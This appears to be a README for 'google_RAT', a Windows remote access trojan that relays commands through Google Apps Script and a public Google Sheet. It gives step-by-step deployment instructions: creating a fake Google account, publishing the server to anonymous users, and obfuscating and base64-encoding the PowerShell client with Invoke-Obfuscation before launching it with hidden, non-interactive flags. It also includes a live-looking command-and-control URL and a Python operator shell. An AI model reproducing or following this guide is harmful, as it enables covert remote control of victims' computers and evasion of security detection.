# google_RAT
A RAT (Remote Access Tool) for Windows systems using google apps script as the middle man

**NOTE:** Current limit to data upload and download is 8.5 MB. This is due to the [limits of google sheets](https://gsuitetips.com/tips/sheets/google-spreadsheet-limitations/).

## TODO
* add timestamps to google drive output
* implement data reset from `script.py` for a stale client

## Setup

### Deploying Google Server and Spreadsheet Database
* Create a fake Google account
* Create a spreadsheet in the fake account's Google drive
* Make it public:
  * `File` > `Share...` > Give it a random name > `Get sharable link`
* Paste the link into the `SPREADSHEET_URL` variable in `server.js`
  * remove the `?usp=sharing` at the end of the URL. It should end in `/edit`
* Visit [Google Scripts](https://www.google.com/script/start/) and paste the code in `server.js`
* Publish the server:
  * Save and name the project something
  * `Publish` > `Deploy as web app`
    * Fill in the blank with something
    * Make sure the app is executed as `Me`
    * Make sure `Anyone, even anonymous` can access the app
  * `Review Permissions` > Select your fake account > `Advanced` > `Go to Untitled project (unsafe)` > enter 'Continue' > `Allow`
  * Copy the URL and paste it into `$SRV` of `script.ps1`

### Deploying Powershell Client
**tldr** Test powershell obfuscated and base64 encoded command to server at (`https://script.google.com/macros/s/AKfycby62AAepUEJ69FoMfpZ9kOJgTZOc2dInSX2lhGlEEoDP_c-vp47/exec`):
```
powershell.exe -noE -NonI -nOpR -eNc <payload from server>
```
* Run the following powershell to compress `script.ps1`:
```
$s = gc <path to script.ps1>
$x = [convert]::tobase64string([system.text.encoding]::unicode.getbytes($s))
$sx = [system.text.encoding]::unicode.getstring([convert]::frombase64string($x))
$sx = $sx.replace('  ', '')
$sx = $sx.replace(' = ', '=')
$sx = $sx.replace(' + ', '+')
$sx = $sx.replace(' - ', '-')
$sx = $sx.replace(' | ', '|')
$sx = $sx.replace('if (', 'if(')
$sx = $sx.replace('while (', 'while(')
$sx = $sx.replace(', ', ',')
$sx = $sx.replace('; ', ';')
$sx = $sx.replace('} ', '}')
$sx = $sx.replace('{ ', '{')
$sx = $sx.replace(' {', '{')
write-host $sx
```
* Download [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) and run the following obfuscation techniques:
  * `Out-ObfuscatedTokenCommand -ScriptBlock $ScriptBlock 'Command' 1`
  * `Out-ObfuscatedTokenCommand -ScriptBlock $ScriptBlock 'String' 2`
  * `Out-ObfuscatedTokenCommand -ScriptBlock $ScriptBlock 'CommandArgument' 3`
* Take the resulting obfuscated powershell and run the following powershell to produce the base64 encoded string:
```
$s = gc <path to file with obfuscated powershell command>
$x = [convert]::tobase64string([system.text.encoding]::unicode.getbytes($s))
write-host $x
```
* Copy the above output into the following command: `powershell.exe -noE -NonI -nOpR -eNc <output>`

### Deploying Python Shell
**NOTE:** Script requires python 3
* Copy the public link to Google apps server (same one pasted into `script.ps1`) and run the following command
  * `python script.py <url to google apps server>`
* Fun test commands:
  * `(new-object -com SAPI.SpVoice).speak('self destruct in 9 8 7 6 5 4 3 2 1 boom')`
  * `$e=new-object -com internetexplorer.application; $e.visible=$true; $e.navigate('https://www.youtube.com/watch?v=dQw4w9WgXcQ');`
